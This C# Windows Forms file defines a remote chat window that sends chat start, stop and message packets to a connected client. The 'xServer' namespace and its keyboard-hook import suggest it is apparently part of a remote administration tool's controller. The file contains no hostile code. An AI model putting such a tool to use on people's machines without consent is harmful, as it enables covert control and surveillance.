using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;
using xServer.Core.MouseKeyHook;

namespace xServer.Forms
{
    public partial class FrmRemoteChat : Form
    {
        public bool IsStarted { get; private set; }
        private readonly Client _connectClient;

        public FrmRemoteChat(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmChat = this;

            InitializeComponent();
        }
     
        private void FrmRemoteChat_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Chat", _connectClient);

            new Core.Packets.ServerPackets.DoChatStart().Execute(_connectClient);
        }

        private void FrmRemoteChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmChat = null;

            new Core.Packets.ServerPackets.DoChatStop().Execute(_connectClient);
        }

        public void AddMessage(string sender, string message)
        {
            txtMessages.Invoke((MethodInvoker)delegate
            {
                txtMessages.AppendText(string.Format("{0} {1}: {2}{3}", DateTime.Now.ToString("HH:mm:ss"), sender, message,Environment.NewLine));
            });
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            if(txtMessage.Text.Trim() != "")
            {
                new Core.Packets.ServerPackets.DoChatMessage(txtMessage.Text.Trim()).Execute(_connectClient);
                AddMessage("Me", txtMessage.Text.Trim());
                txtMessage.Text = "";
            }
        }

        private void FrmRemoteChat_Shown(object sender, EventArgs e)
        {
            txtMessage.Focus();
        }
    }
}
